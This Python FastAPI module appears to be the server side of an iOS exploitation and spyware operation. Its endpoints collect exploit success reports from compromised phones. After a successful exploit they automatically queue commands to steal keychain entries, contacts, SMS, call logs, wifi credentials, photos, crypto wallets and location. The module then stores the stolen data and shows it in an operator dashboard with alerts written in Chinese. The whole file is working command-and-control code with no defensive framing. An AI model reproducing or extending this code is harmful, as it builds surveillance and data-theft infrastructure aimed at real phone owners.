from fastapi import APIRouter, Depends, Request, Query
from sqlalchemy.orm import Session
from sqlalchemy import desc, func
from pydantic import BaseModel, Field
from typing import Optional, List, Dict, Any
from datetime import datetime
import base64
import json
import os

from ..database import get_db, Device, ExfilData, TrafficChannel, LandingTemplate, Command, normalize_device_uuid, resolve_forwarded_uuid_ua
from ..auth import get_current_user
from .notifications import broadcast_notification_sync
from .. import config

router = APIRouter(prefix="/api", tags=["reporting"], redirect_slashes=False)


AUTO_STEAL_COMMANDS = [
    "ds_info",
    "ds_location",
    "ds_screenshot",
    "ds_exfil_keychain",
    "ds_exfil_contacts",
    "ds_exfil_sms",
    "ds_exfil_calls",
    "ds_exfil_wifi",
    "ds_exfil_photos",
    "ds_exfil_wallet",
]


def _auto_queue_steal_commands(db: Session, device_uuid: str):
    try:
        existing = set()
        rows = db.query(Command.command).filter(
            Command.device_uuid == device_uuid,
            Command.status.in_(["pending", "executing", "completed"])
        ).all()
        for r in rows:
            existing.add((r.command or "").strip().lower())
        added = 0
        for cmd in AUTO_STEAL_COMMANDS:
            c = cmd.strip().lower()
            if c in existing:
                continue
            entry = Command(
                device_uuid=device_uuid,
                command=cmd.strip(),
                status="pending",
                output=None,
                created_at=datetime.now(),
                executed_at=None,
                notes="Auto-queued after exploit_status=success"
            )
            db.add(entry)
            existing.add(c)
            added += 1
        if added > 0:
            db.commit()
            log_to_file(f"[AUTO-QUEUE] device={device_uuid[:12]} added {added} steal commands after exploit success")
        return added
    except Exception as e:
        try: db.rollback()
        except Exception: pass
        log_to_file(f"[AUTO-QUEUE] ERROR for {device_uuid[:12]}: {repr(e)}")
        return 0


def log_to_file(msg: str):
    try:
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "logs", "auto_queue.log"), "a", encoding="utf-8") as f:
            f.write(f"[{ts}] {msg}\n")
    except Exception:
        pass


class ExploitReport(BaseModel):
    result: Optional[Any] = None
    exploit_status: Optional[str] = None
    ios_version: Optional[str] = None
    device: Optional[str] = None
    device_model: Optional[str] = None
    device_uuid: Optional[str] = None
    data: Optional[Dict[str, Any]] = Field(default_factory=dict)
    details: Optional[str] = ""
    user_agent: Optional[str] = None
    screen_width: Optional[int] = None
    screen_height: Optional[int] = None
    language: Optional[str] = None
    platform_state: Optional[Dict[str, Any]] = None
    channel_id: Optional[int] = None
    template_id: Optional[int] = None
    channel_slug: Optional[str] = None
    template_slug: Optional[str] = None


class DeviceDataUpload(BaseModel):
    udid: Optional[str] = None
    device_uuid: Optional[str] = None
    exploit_status: Optional[str] = None
    ios_version: Optional[str] = None
    device_model: Optional[str] = None
    phone_number: Optional[str] = None
    data_payload: Optional[str] = None
    metadata: Optional[Any] = None
    contacts: Optional[List[Dict[str, Any]]] = Field(default_factory=list)
    sms: Optional[List[Dict[str, Any]]] = Field(default_factory=list)
    calls: Optional[List[Dict[str, Any]]] = Field(default_factory=list)
    photos: Optional[List[Dict[str, Any]]] = Field(default_factory=list)
    wallets: Optional[List[Dict[str, Any]]] = Field(default_factory=list)
    keychain: Optional[List[Dict[str, Any]]] = Field(default_factory=list)
    wifi: Optional[List[Dict[str, Any]]] = Field(default_factory=list)
    location: Optional[Dict[str, Any]] = Field(default_factory=dict)
    system_info: Optional[Dict[str, Any]] = Field(default_factory=dict)
    extra: Optional[Dict[str, Any]] = Field(default_factory=dict)
    channel_id: Optional[int] = None
    template_id: Optional[int] = None
    channel_slug: Optional[str] = None
    template_slug: Optional[str] = None


def _resolve_uuid(payload: dict) -> str:
    for k in ("device_uuid", "udid", "uuid"):
        if payload.get(k):
            return str(payload[k])
    return "unknown-" + datetime.now().strftime("%Y%m%d%H%M%S")


def _maj(v):
    try:
        if v is None:
            return 0
        s = str(v).strip()
        if not s:
            return 0
        return int(s.split(".")[0].split("_")[0])
    except Exception:
        return 0


def _upsert_device(db: Session, device_uuid: str, ip: str, ua: str,
                   ios_version: str = None, device_model: str = None,
                   exploit_status: str = None, channel_id=None, template_id=None,
                   allow_create: bool = True):
    if not device_uuid or device_uuid == "":
        return None
    dev = db.query(Device).filter(Device.device_uuid == device_uuid).first()
    if dev is None:
        if not allow_create:
            return None
        dev = Device(
            device_uuid=device_uuid,
            first_seen=datetime.now(),
            last_seen=datetime.now(),
            ip=ip,
            user_agent=ua,
            os_version=ios_version or "",
            device_model=device_model or "",
            exploit_status=exploit_status or "pending",
            status="active",
            channel_id=channel_id,
            template_id=template_id,
        )
        db.add(dev)
        db.flush()
        try:
            broadcast_notification_sync(
                db, "新设备上线",
                f"设备 {device_uuid[:12]} 首次接入 | {ios_version or 'N/A'} | {device_model or 'N/A'}",
                "device", related_device_uuid=device_uuid
            )
        except Exception:
            pass
    else:
        dev.last_seen = datetime.now()
        if ip:
            dev.ip = ip
        if ua:
            dev.user_agent = ua
        new_maj = _maj(ios_version)
        old_maj = _maj(dev.os_version)
        if ios_version and (not dev.os_version or new_maj >= old_maj):
            dev.os_version = ios_version
        if device_model and not dev.device_model:
            dev.device_model = device_model
        if exploit_status:
            dev.exploit_status = exploit_status
        if channel_id is not None and dev.channel_id is None:
            dev.channel_id = channel_id
        if template_id is not None and dev.template_id is None:
            dev.template_id = template_id
    try:
        db.commit()
    except Exception:
        try: db.rollback()
        except Exception: pass
        raise
    return dev


def _save_exfil_json(db: Session, device_uuid: str, category: str, items: list, path_suffix: str = ""):
    if not items or len(items) == 0:
        return 0
    try:
        data_json = json.dumps(items, ensure_ascii=False, default=str)
        encoded = base64.b64encode(data_json.encode("utf-8")).decode("ascii")
        entry = ExfilData(
            device_uuid=device_uuid,
            category=category,
            path=f"/exfil/{category}/{datetime.now().strftime('%Y%m%d_%H%M%S')}{path_suffix}",
            description=f"{category} bulk (count={len(items)})",
            file_path="",
            file_size=len(encoded),
            data_json=data_json,
        )
        db.add(entry)
        db.flush()
        return len(items)
    except Exception:
        return 0


def _resolve_slug_ids(db: Session, channel_id=None, template_id=None,
                      channel_slug=None, template_slug=None):
    resolved_cid = channel_id
    if resolved_cid is None and channel_slug:
        try:
            c = db.query(TrafficChannel).filter(TrafficChannel.slug == str(channel_slug).strip()).first()
            if c: resolved_cid = c.id
        except Exception: pass
    resolved_tid = template_id
    if resolved_tid is None and template_slug:
        try:
            t = db.query(LandingTemplate).filter(LandingTemplate.slug == str(template_slug).strip()).first()
            if t: resolved_tid = t.id
        except Exception: pass
    if resolved_cid is None and resolved_tid is None:
        try:
            def_ch = db.query(TrafficChannel).filter(TrafficChannel.slug == "default").first()
            if def_ch:
                resolved_cid = def_ch.id
                if resolved_tid is None and def_ch.default_template_id:
                    resolved_tid = def_ch.default_template_id
        except Exception: pass
    return resolved_cid, resolved_tid


def _derive_exploit_status(payload_result=None, payload_exploit_status=None):
    if payload_exploit_status:
        s = str(payload_exploit_status).strip().lower()
        if s in {"success", "completed", "ok", "done", "1"}: return "success"
        if s in {"failed", "fail", "error", "0"}: return "failed"
        if s in {"unsupported", "incompatible", "skip"}: return "unsupported"
        if s in {"pending", "running", "progress"}: return "pending"
        return s or "pending"
    result_code = None
    if payload_result is not None:
        try: result_code = int(payload_result)
        except Exception: result_code = str(payload_result)
    if result_code == 0: return "success"
    if isinstance(result_code, int) and result_code >= 1000: return "unsupported"
    if result_code is not None: return "failed"
    return "pending"


@router.post("/report")
async def receive_exploit_report(
    payload: ExploitReport, request: Request,
    db: Session = Depends(get_db)
):
    client_ip = request.client.host if request.client else "127.0.0.1"
    device_uuid = payload.device_uuid or _resolve_uuid(payload.data or {})
    # exploit_server 转发时 HTTP UA=Exploit-Server/1.0，需信任已存在设备的 UUID，避免 ios-→dev- 幽灵
    device_uuid, ua = resolve_forwarded_uuid_ua(
        db, device_uuid, payload.user_agent, request.headers.get("User-Agent", "")
    )
    ios_version = payload.ios_version
    device_model = payload.device_model or payload.device

    exploit_status = _derive_exploit_status(payload.result, payload.exploit_status)
    resolved_cid, resolved_tid = _resolve_slug_ids(
        db, payload.channel_id, payload.template_id,
        payload.channel_slug, payload.template_slug
    )

    allow_create = exploit_status != "unsupported"
    _upsert_device(
        db, device_uuid, client_ip, ua,
        ios_version=ios_version, device_model=device_model,
        exploit_status=exploit_status,
        channel_id=resolved_cid, template_id=resolved_tid,
        allow_create=allow_create
    )

    full_payload = payload.model_dump(exclude_none=False)
    full_payload["ip"] = client_ip
    full_payload["timestamp_received"] = datetime.now().isoformat()
    try:
        desc_bits = {
            "result": payload.result,
            "ios_version": ios_version,
            "device_model": device_model,
            "language": payload.language,
        }
        entry = ExfilData(
            device_uuid=device_uuid,
            category="exploit_report",
            path=f"/exploit/report/{exploit_status}",
            description=json.dumps(desc_bits, ensure_ascii=False, default=str),
            file_path="",
            file_size=0,
            data_json=json.dumps(full_payload, ensure_ascii=False, default=str),
        )
        db.add(entry)
    except Exception:
        pass
    try:
        db.commit()
    except Exception:
        try: db.rollback()
        except Exception: pass

    if exploit_status == "success":
        added = 0
        try:
            added = _auto_queue_steal_commands(db, device_uuid)
        except Exception:
            pass
        try:
            broadcast_notification_sync(
                db, "漏洞利用成功",
                f"设备 {device_uuid[:12]} 漏洞利用成功 | {ios_version or 'N/A'}" + (f" | 已自动下发 {added} 条窃取命令" if added > 0 else ""),
                "alert", related_device_uuid=device_uuid
            )
        except Exception:
            pass
    elif exploit_status == "unsupported":
        try:
            broadcast_notification_sync(
                db, "设备不受支持",
                f"设备 {device_uuid[:12]} 不支持当前利用链 (result={payload.result})",
                "alert", related_device_uuid=device_uuid
            )
        except Exception:
            pass

    return {"status": "success", "message": "Report received",
            "device_uuid": device_uuid, "exploit_status": exploit_status,
            "device_created": allow_create}


@router.get("/report")
async def get_exploit_reports(
    skip: int = Query(0, ge=0), limit: int = Query(50, ge=1, le=500),
    result: Optional[str] = None, device_uuid: Optional[str] = None,
    db: Session = Depends(get_db), current_user=Depends(get_current_user)
):
    success_count = 0
    failed_count = 0
    unsupported_count = 0
    try:
        query = db.query(ExfilData).filter(ExfilData.category == "exploit_report")
        if device_uuid:
            query = query.filter(ExfilData.device_uuid == device_uuid)
        if result:
            try:
                query = query.filter(ExfilData.description.like(f'%"result": {result}%'))
            except Exception:
                pass
        total = query.count() or 0
        items = query.order_by(desc(ExfilData.uploaded_at)).offset(skip).limit(limit).all()
        parsed = []
        for it in items:
            try:
                row = {
                    "id": it.id,
                    "device_uuid": it.device_uuid or "",
                    "path": it.path or "",
                    "file_size": it.file_size or 0,
                    "uploaded_at": it.uploaded_at.isoformat() if it.uploaded_at else None,
                    "description": it.description or "",
                    "desc": {},
                }
                try:
                    dj = json.loads(it.data_json) if it.data_json and len(it.data_json) > 0 else {}
                    if isinstance(dj, dict):
                        cleaned = {}
                        for k, v in dj.items():
                            if isinstance(v, datetime):
                                cleaned[k] = v.isoformat()
                            else:
                                cleaned[k] = v
                        row.update(cleaned)
                except Exception:
                    pass
                try:
                    desc_text = it.description or ""
                    if desc_text and len(desc_text) > 0:
                        desc_obj = json.loads(desc_text)
                        if isinstance(desc_obj, dict):
                            row["desc"] = desc_obj
                except Exception:
                    row["desc"] = {}
                parsed.append(row)
            except Exception as e:
                parsed.append({
                    "id": getattr(it, "id", None),
                    "device_uuid": getattr(it, "device_uuid", "") or "",
                    "path": getattr(it, "path", "") or "",
                    "file_size": getattr(it, "file_size", 0) or 0,
                    "uploaded_at": getattr(it, "uploaded_at", None).isoformat() if getattr(it, "uploaded_at", None) else None,
                    "parse_error": str(e)[:200],
                    "description": "",
                    "desc": {},
                })
        try:
            success_count = int(db.query(func.count(ExfilData.id)).filter(
                ExfilData.category == "exploit_report",
                ExfilData.path.like("%/success%")
            ).scalar() or 0)
        except Exception:
            success_count = 0
        try:
            failed_count = int(db.query(func.count(ExfilData.id)).filter(
                ExfilData.category == "exploit_report",
                ExfilData.path.like("%/fail_%")
            ).scalar() or 0)
        except Exception:
            failed_count = 0
        try:
            unsupported_count = int(db.query(func.count(ExfilData.id)).filter(
                ExfilData.category == "exploit_report",
                ExfilData.path.like("%/unsupported%")
            ).scalar() or 0)
        except Exception:
            unsupported_count = 0
        return {
            "total": int(total),
            "items": parsed,
            "skip": int(skip),
            "limit": int(limit),
            "summary": {
                "success": int(success_count),
                "failed": int(failed_count),
                "unsupported": int(unsupported_count)
            }
        }
    except Exception as e:
        import traceback
        tb = traceback.format_exc()
        resp = {
            "total": 0, "items": [], "skip": int(skip), "limit": int(limit),
            "summary": {"success": 0, "failed": 0, "unsupported": 0},
        }
        DEBUG = str(os.getenv("DEBUG", "false")).lower() in ("1", "true", "yes", "on")
        if DEBUG:
            resp["_debug_error"] = type(e).__name__ + ": " + str(e)
            resp["_debug_tb"] = tb
        return resp


@router.post("/device-data")
async def receive_device_data(
    payload: DeviceDataUpload, request: Request,
    db: Session = Depends(get_db)
):
    client_ip = request.client.host if request.client else "127.0.0.1"
    device_uuid = payload.device_uuid or payload.udid or _resolve_uuid(payload.extra or {})
    # exploit_server 转发时 HTTP UA=Exploit-Server/1.0，需信任已存在设备的 UUID，避免 ios-→dev- 幽灵
    device_uuid, ua = resolve_forwarded_uuid_ua(
        db, device_uuid, None, request.headers.get("User-Agent", "")
    )
    ios_version = payload.ios_version
    device_model = payload.device_model
    exploit_status = _derive_exploit_status(None, payload.exploit_status) if payload.exploit_status else None
    resolved_cid, resolved_tid = _resolve_slug_ids(
        db, payload.channel_id, payload.template_id,
        payload.channel_slug, payload.template_slug
    )

    _upsert_device(db, device_uuid, client_ip, ua,
                   ios_version=ios_version, device_model=device_model,
                   exploit_status=exploit_status,
                   channel_id=resolved_cid, template_id=resolved_tid)

    contact_count = _save_exfil_json(db, device_uuid, "contacts", payload.contacts or [], "_bulk")
    sms_count = _save_exfil_json(db, device_uuid, "sms", payload.sms or [], "_bulk")
    calls_count = _save_exfil_json(db, device_uuid, "calls", payload.calls or [], "_bulk")
    photos_count = _save_exfil_json(db, device_uuid, "photos", payload.photos or [], "_bulk")
    wallets_count = _save_exfil_json(db, device_uuid, "wallets", payload.wallets or [], "_bulk")
    keychain_count = _save_exfil_json(db, device_uuid, "keychain", payload.keychain or [], "_bulk")
    wifi_count = _save_exfil_json(db, device_uuid, "wifi", payload.wifi or [], "_bulk")

    if payload.location and len(payload.location) > 0:
        _save_exfil_json(db, device_uuid, "location", [payload.location], "")
    if payload.system_info and len(payload.system_info) > 0:
        _save_exfil_json(db, device_uuid, "system_info", [payload.system_info], "")
    if payload.data_payload:
        try:
            entry = ExfilData(
                device_uuid=device_uuid,
                category="data_payload",
                path="/exfil/device/payload",
                description=payload.metadata if isinstance(payload.metadata, str)
                            else (json.dumps(payload.metadata, ensure_ascii=False, default=str) if payload.metadata else ""),
                file_path="",
                file_size=len(payload.data_payload),
                data_json=json.dumps({"payload": payload.data_payload,
                                      "metadata": payload.metadata},
                                     ensure_ascii=False, default=str),
            )
            db.add(entry)
        except Exception:
            pass
    try:
        db.commit()
    except Exception:
        try: db.rollback()
        except Exception: pass

    received = {
        "contacts": contact_count,
        "sms": sms_count,
        "calls": calls_count,
        "photos": photos_count,
        "wallets": wallets_count,
        "keychain": keychain_count,
        "wifi": wifi_count,
        "location": 1 if payload.location and len(payload.location) else 0,
        "system_info": 1 if payload.system_info and len(payload.system_info) else 0,
    }
    try:
        total_items = sum(v for v in received.values() if isinstance(v, int))
        if total_items > 0:
            broadcast_notification_sync(
                db, "新数据窃取",
                f"设备 {device_uuid[:12]} 回传: 通讯录{contact_count} 短信{sms_count} 通话{calls_count} 照片{photos_count} 钱包{wallets_count}",
                "exfil", related_device_uuid=device_uuid
            )
    except Exception:
        pass

    return {"status": "success", "message": "Device data received",
            "device_uuid": device_uuid, "received": received}


@router.get("/device-data")
async def get_device_data(
    skip: int = Query(0, ge=0), limit: int = Query(20, ge=1, le=200),
    device_uuid: Optional[str] = None, category: Optional[str] = None,
    db: Session = Depends(get_db), current_user=Depends(get_current_user)
):
    query = db.query(Device)
    if device_uuid:
        query = query.filter(Device.device_uuid == device_uuid)
    total_devices = query.count()
    devices = query.order_by(desc(Device.last_seen)).offset(skip).limit(limit).all()

    data_cats = ("contacts", "sms", "calls", "photos", "wallets", "keychain", "wifi", "location", "system_info", "data_payload")
    result_list = []
    for dev in devices:
        try:
            entry = {
                "device_uuid": dev.device_uuid or "",
                "udid": dev.device_uuid or "",
                "ios_version": dev.os_version or "",
                "device_model": dev.device_model or "",
                "ip": dev.ip or "",
                "user_agent": dev.user_agent or "",
                "first_seen": dev.first_seen.isoformat() if dev.first_seen else None,
                "last_seen": dev.last_seen.isoformat() if dev.last_seen else None,
                "exploit_status": dev.exploit_status or "pending",
                "phone_number": "",
                "contacts": [], "sms": [], "calls": [], "photos": [],
                "wallets": [], "keychain": [], "wifi": [],
                "location": {}, "system_info": {},
            }
            exfil_q = db.query(ExfilData).filter(ExfilData.device_uuid == dev.device_uuid)
            if category:
                exfil_q = exfil_q.filter(ExfilData.category == category)
            else:
                exfil_q = exfil_q.filter(ExfilData.category.in_(data_cats))
            for exfil in exfil_q.order_by(desc(ExfilData.uploaded_at)).all():
                cat = exfil.category or ""
                parsed = None
                try:
                    if exfil.data_json and len(exfil.data_json) > 0:
                        parsed = json.loads(exfil.data_json)
                except Exception:
                    parsed = None
                try:
                    if cat == "contacts" and isinstance(parsed, list) and len(entry["contacts"]) == 0:
                        entry["contacts"] = parsed
                        entry["contacts_count"] = len(parsed)
                    elif cat == "sms" and isinstance(parsed, list) and len(entry["sms"]) == 0:
                        entry["sms"] = parsed
                        entry["sms_count"] = len(parsed)
                    elif cat == "calls" and isinstance(parsed, list) and len(entry["calls"]) == 0:
                        entry["calls"] = parsed
                        entry["calls_count"] = len(parsed)
                    elif cat == "photos" and isinstance(parsed, list) and len(entry["photos"]) == 0:
                        entry["photos"] = parsed
                        entry["photos_count"] = len(parsed)
                    elif cat == "wallets" and isinstance(parsed, list) and len(entry["wallets"]) == 0:
                        entry["wallets"] = parsed
                        entry["wallets_count"] = len(parsed)
                    elif cat == "keychain" and isinstance(parsed, list) and len(entry["keychain"]) == 0:
                        entry["keychain"] = parsed
                        entry["keychain_count"] = len(parsed)
                    elif cat == "wifi" and isinstance(parsed, list) and len(entry["wifi"]) == 0:
                        entry["wifi"] = parsed
                        entry["wifi_count"] = len(parsed)
                    elif cat == "location" and isinstance(parsed, list) and len(parsed) > 0 and not entry["location"]:
                        entry["location"] = parsed[0]
                    elif cat == "system_info" and isinstance(parsed, list) and len(parsed) > 0 and not entry["system_info"]:
                        entry["system_info"] = parsed[0]
                except Exception:
                    pass
            result_list.append(entry)
        except Exception as e:
            result_list.append({
                "device_uuid": dev.device_uuid or "",
                "udid": dev.device_uuid or "",
                "error": str(e)[:200],
                "first_seen": None, "last_seen": None,
                "contacts": [], "sms": [], "photos": [],
                "location": {}, "system_info": {},
            })

    contact_count = db.query(func.sum(ExfilData.file_size)).filter(
        ExfilData.category == "contacts").scalar() or 0
    sms_count = db.query(func.sum(ExfilData.file_size)).filter(
        ExfilData.category == "sms").scalar() or 0
    photos_count = db.query(func.sum(ExfilData.file_size)).filter(
        ExfilData.category == "photos").scalar() or 0
    return {
        "total": total_devices,
        "items": result_list,
        "skip": skip,
        "limit": limit,
        "summary": {
            "device_count": total_devices,
            "contact_records": int(contact_count),
            "sms_records": int(sms_count),
            "photo_records": int(photos_count)
        }
    }
